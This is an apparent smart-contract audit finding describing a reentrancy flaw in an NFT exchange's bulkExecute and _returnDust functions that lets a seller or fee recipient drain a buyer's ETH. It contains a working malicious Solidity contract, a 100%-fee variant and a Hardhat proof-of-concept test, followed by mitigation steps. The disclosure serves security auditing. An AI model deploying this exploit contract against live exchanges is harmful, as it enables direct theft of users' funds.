## Tags

- bug
- 3 (High Risk)
- primary issue
- selected for report
- sponsor confirmed
- edited-by-warden
- H-01

# [Direct theft of buyers ETH funds.](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/96) 

# Lines of code

https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168
https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565
https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212
https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L154


# Vulnerability details

## Impact

Most severe issue: 
**A Seller or Fee recipient can steal ETH funds from the buyer when he is making a single or bulk execution. (Direct theft of funds).**

Additional impacts that can be caused by these bugs:
1. Seller or Fee recipient can cause next in line executions to revert in `bulkExecute` (by altering `isInternal`, insufficient funds, etc..)
2. Seller or Fee recipient can call `_execute` externally 
3. Seller or Fee recipient can set a caller `_remainingETH` to 0 (will not get refunded)

## Proof of Concept
Background:
* The protocol added a `bulkExecute` function that allows multiple orders to execute. The implementation is implemented in a way that if an `_execute` of a single order reverts, it will not break additional or previous successful `_execute`s. It is therefore very important to track actual ETH used by the function. 
* The protocol has recognized the need to track buyers ETH in order to refund unused ETH by implementing the `_returnDust` function and `setupExecution` modifier. This ensures that calls to `_execute` must be internal and have proper accounting of remainingETH. 
* Fee recipient is controlled by the seller. The seller determines the recipients and fee rates.

The new implementations creates an attack vectors that allows the Seller or Fee recipient to steal ETH.

There are three main bugs that can be exploited to steal the ETH:
1. Reentrancy is possible by feeRecipient as long as `_execute` is not called (`_execute` has a reentrancyGuard)
2. `bulkExecute` can be called with an empty parameter. This allows the caller to not enter `_execute` and call `_returnDust`
3. `_returnDust` sends the entire balance of the contract to the caller.

(Side note: I issued the 3 bugs together in this one report in order to show impact and better reading experience for sponsor and judge. If you see fit, these three bugs can be split to three different findings)

There are two logical scenarios where the heist could originate from:
1. Malicious seller: The seller can set the fee recipient to a malicious contract.
2. Malicious fee recipient: fee recipient can steal the funds without the help of the seller. 

Consider the scenario (#1) where feeRecipient rate 10% of token price 1 ETH:
1. Bob (Buyer) wants to execute 4 orders with ETH. Among the orders is Alice's (seller) sell order (lets assume first in line).
2. Bob calls `bulkExecute` with `4 ETH`. `1 ETH` for every order. 
3. Alice's sell order gets executed. Fee  `0.1 ETH` is sent to feeRecipient (controlled by Alice).
4. feeRecipient *reenters* `bulkExecute` with *empty* array as parameter and `1 WEI` of data
5. `_returnDust` returns the balance of the contract to feeRecipient `3.9 ETH`.
6. feeRecipient sends `3.1 ETH` to seller (or any other beneficiary)
7. feeRecipient call `selfdestruct` opcode that transfers `0.9 ETH` to Exchange contract. This is in order to keep `_execute` from reverting when paying the seller.
8. `_execute` pays seller  `0.9 ETH` 
9. Sellers balance is `4 ETH`. 
10. The rest of the `_execute` calls by `bulkExecute` will get reverted because buyer cannot pay as his funds were stolen.
11. Buyers `3 ETH` funds stolen

```
┌───────────┐            ┌──────────┐         ┌───────────────┐    ┌───────────┐
│           │            │          │         │               │    │           │
│   Buyer   │            │ Exchange │         │ Fee Recipient │    │  Seller   │
│           │            │          │         │               │    │           │
└─────┬─────┘            └────┬─────┘         └───────┬───────┘    └─────┬─────┘
      │                       │                       │                  │
      │ bulkExecute(4 orders) │                       │                  │
      │         4 ETH         │                       │                  │
      ├──────────────────────►│                       │                  │
      │                       │_execute sends 0.1 ETH │                  │
      │                       ├──────────────────────►│                  │
      │                       │                       │                  │
      │                       │ bulkExecute(0 orders) │                  │
      │                       │         1 WEI         │                  │
      │                       │◄──────────────────────┤                  │
      │                       │                       │                  │
      │                       │    _retrunDust sends  │                  │
      │                       │         3.9 ETH       │                  │
      │                       ├──────────────────────►│  Send 3.1 ETH    │
      │                       │                       ├─────────────────►│
      │                       │ Self destruct send    │                  │
      │                       │         0.9 ETH       │                  │
      │                       │◄──────────────────────┤                  │
      │                       │                       │                  │
      │                       │_execute sends 0.9 ETH │                  │
      │                       ├───────────────────────┼─────────────────►│
      │                       │                       │                  │
      │                       ├──────┐ _execute revert│                  │
      │                       │      │     3 times    │                  │
  ┌───┴───┐                   │◄─────┘                │              ┌───┴───┐
  │3 ETH  │                   │                       │              │4 ETH  │
  │Stolen │                                                          │Balance│
  └───────┘                                                          └───────┘
```

Here is a possible implementation of the fee recipient contract:
```
contract MockFeeReceipient {

    bool lock;
    address _seller;
    uint256 _price;

    constructor(address seller, uint256 price) {
        _seller = seller;
        _price = price;
    }
    receive() external payable {
        Exchange ex = Exchange(msg.sender);
        if(!lock){
            lock = true;
            // first entrance when receiving fee
            uint256 feeAmount = msg.value;
            // Create empty calldata for bulkExecute and call it
            Execution[] memory executions = new Execution[](0);
            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);
            address(ex).call{value: 1}(data);

            // Now we received All of buyers funds. 
            // Send stolen ETH to seller minus the amount needed in order to keep execution.
            address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');

            // selfdestruct and send funds needed to Exchange (to not revert)
            selfdestruct(payable(msg.sender));
        }
        else{
            // Second entrance after steeling balance
            // We will get here after getting funds from reentrancy
        }
    }
}
```

Important to know:
the exploit becomes much easier if the set fee rate is 10000 (100% of the price). This can be set by the seller. In such case, the fee recipient does not need to send funds back to the exchange contract. In such case, step #7-8 can be removed. Example code for 100% fee scenario:

```
pragma solidity 0.8.17;

import { Exchange } from "../Exchange.sol";
import { Execution } from "../lib/OrderStructs.sol";

contract MockFeeReceipient {

    bool lock;
    address _seller;
    uint256 _price;
    
    constructor(address seller, uint256 price) {
        _seller = seller;
        _price = price;
    }
    receive() external payable {
        Exchange ex = Exchange(msg.sender);
        if(!lock){
            lock = true;
            // first entrance when receiving fee
            uint256 feeAmount = msg.value;
            // Create empty calldata for bulkExecute and call it
            Execution[] memory executions = new Execution[](0);
            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);
            address(ex).call{value: 1}(data);
        }
        else{
            // Second entrance after steeling balance
            // We will get here after getting funds from reentrancy
        }
    }
}
```

In the POC we talk mostly about `bulkExecute` but `execute` of a single execution can steal the buyers excessive ETH.
### Technical walkthrough of scenario

Buyers can call `execute` or `bulkExecute` to start an execution of orders.  
Both functions have a `setupExecution` modifier that stores the amount of ETH the caller has sent for the transactions:

`bulkExecute` in `Exchange.sol`:
https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168
```
    function bulkExecute(Execution[] calldata executions)
        external
        payable
        whenOpen
        setupExecution
    {
```

`setupExecution`:
https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L40
```
    modifier setupExecution() {
        remainingETH = msg.value;
        isInternal = true;
        _;
        remainingETH = 0;
        isInternal = false;
    }
```

`_execute` will be called to handle the buy and sell order.
* The function has a reentracnyGuard. 
* The function will check that the orders are signed correctly and that both orders match.
* If everything is OK, `_executeFundsTransfer` will be called to transfer the buyers funds to the seller and fee recipient

`_executeFundsTransfer`:
https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565
```
    function _executeFundsTransfer(
        address seller,
        address buyer,
        address paymentToken,
        Fee[] calldata fees,
        uint256 price
    ) internal {
        if (msg.sender == buyer && paymentToken == address(0)) {
            require(remainingETH >= price);
            remainingETH -= price;
        }

        /* Take fee. */
        uint256 receiveAmount = _transferFees(fees, paymentToken, buyer, price);

        /* Transfer remainder to seller. */
        _transferTo(paymentToken, buyer, seller, receiveAmount);
    }
```

Fees are calculated based on the rate set by the seller and send to the fee recipient in `_transferFees`. 

When the fee recipient receives the funds. They can reenter the Exchange contract and drain the balance of contract. 
This can be done through `bulkExecution`.

`bulkExecution` can be called with an empty array. If so, no `_execute` function will be called and therefore no reentrancyGuard will trigger.
At the end of `bulkExecution`, `_returnDust` function is called to return excessive funds.

`bulkExecute`: 
https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168
```
    function bulkExecute(Execution[] calldata executions)
        external
        payable
        whenOpen
        setupExecution
    {
        /*
        REFERENCE
        uint256 executionsLength = executions.length;
        for (uint8 i=0; i < executionsLength; i++) {
            bytes memory data = abi.encodeWithSelector(this._execute.selector, executions[i].sell, executions[i].buy);
            (bool success,) = address(this).delegatecall(data);
        }
        _returnDust(remainingETH);
        */
        uint256 executionsLength = executions.length;
        for (uint8 i = 0; i < executionsLength; i++) {
```

`_returnDust`:
https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212
```
    function _returnDust() private {
        uint256 _remainingETH = remainingETH;
        assembly {
            if gt(_remainingETH, 0) {
                let callStatus := call(
                    gas(),
                    caller(),
                    selfbalance(),
                    0,
                    0,
                    0,
                    0
                )
            }
        }
    }
```

After the fee recipient drains the rest of the 4 ETH funds of the Exchange contract (the buyers funds). They need to transfer a portion back (0.9 ETH) to the Exchange contract in order for the `_executeFundsTransfer` to not revert and be able to send funds (0.9 ETH) to the seller. This can be done using the `selfdestruct` opcode

After that, the `_execute` function will continue and exit normally.
`bulkExecute` will continue to the next order and call `_execute` which will revert. 
Because `bulkExecute` delegatecalls `_execute` and continues even after revert, the function `bulkExecute` will complete its execution without any errors and all the buyers ETH funds will be lost and nothing will be refunded.

### Hardhat POC: 
add the following test to `execution.test.ts`:
```
describe.only('hack', async () => {
      let executions: any[];
      let value: BigNumber;
      beforeEach(async () => {
        await updateBalances();
        const _executions = [];
        value = BigNumber.from(0);
        // deploy MockFeeReceipient
        let contractFactory = await (hre as any).ethers.getContractFactory(
          "MockFeeReceipient",
          {},
        );
        let contractMockFeeReceipient = await contractFactory.deploy(alice.address,price);
        await contractMockFeeReceipient.deployed();
        //generate alice and bob orders. alice fee recipient is MockFeeReceipient. 10% cut
        tokenId += 1;
        await mockERC721.mint(alice.address, tokenId);
        sell = generateOrder(alice, {
          side: Side.Sell,
          tokenId,
          paymentToken: ZERO_ADDRESS,
          fees: [ 
            {
              rate: 1000,
              recipient: contractMockFeeReceipient.address,
            }
          ],
        });
        buy = generateOrder(bob, { 
          side: Side.Buy,
          tokenId,
          paymentToken: ZERO_ADDRESS});
        _executions.push({
            sell: await sell.packNoOracleSig(),
            buy: await buy.packNoSigs(),
        });
        // create 3 more executions
        tokenId += 1;
        for (let i = tokenId; i < tokenId + 3; i++) {
          await mockERC721.mint(thirdParty.address, i);
          const _sell = generateOrder(thirdParty, {
            side: Side.Sell,
            tokenId: i,
            paymentToken: ZERO_ADDRESS,
          });
          const _buy = generateOrder(bob, {
            side: Side.Buy,
            tokenId: i,
            paymentToken: ZERO_ADDRESS,
          });
          _executions.push({
            sell: await _sell.packNoOracleSig(),
            buy: await _buy.packNoSigs(),
          });
        }
        executions = _executions;
      });
      it("steal funds", async () => {
        let aliceBalanceBefore = await alice.getBalance();
        //price = 4 ETH
        value = price.mul(4);
        //call bulkExecute
        tx = await waitForTx(
          exchange.connect(bob).bulkExecute(executions, { value  }));
        let aliceBalanceAfter = await alice.getBalance();
        let aliceEarned = aliceBalanceAfter.sub(aliceBalanceBefore);
        //check that alice received all 4 ETH
        expect(aliceEarned).to.equal(value);
      });
    });
```

Add the following contract to mocks folder:
`MockFeeRecipient.sol`:
```
pragma solidity 0.8.17;

import { Exchange } from "../Exchange.sol";
import { Execution } from "../lib/OrderStructs.sol";

contract MockFeeReceipient {

    bool lock;
    address _seller;
    uint256 _price;

    constructor(address seller, uint256 price) {
        _seller = seller;
        _price = price;
    }
    receive() external payable {
        Exchange ex = Exchange(msg.sender);
        if(!lock){
            lock = true;
            // first entrance when receiving fee
            uint256 feeAmount = msg.value;
            // Create empty calldata for bulkExecute and call it
            Execution[] memory executions = new Execution[](0);
            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);
            address(ex).call{value: 1}(data);

            // Now we received All of buyers funds. 
            // Send stolen ETH to seller minus the amount needed in order to keep execution.
            address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');

            // selfdestruct and send funds needed to Exchange (to not revert)
            selfdestruct(payable(msg.sender));
        }
        else{
            // Second entrance after steeling balance
            // We will get here after getting funds from reentrancy
        }
    }
}

```

Execute `yarn test` to see that test pass (Alice stole all 4 ETH)

## Tools Used
VS code, hardhat

## Recommended Mitigation Steps
1. Put a reentrancyGuard on `execute` and `bulkExecute` functions
2. `_refundDust` return only _remainingETH
3. revert in `bulkExecute` if parameter array is empty.
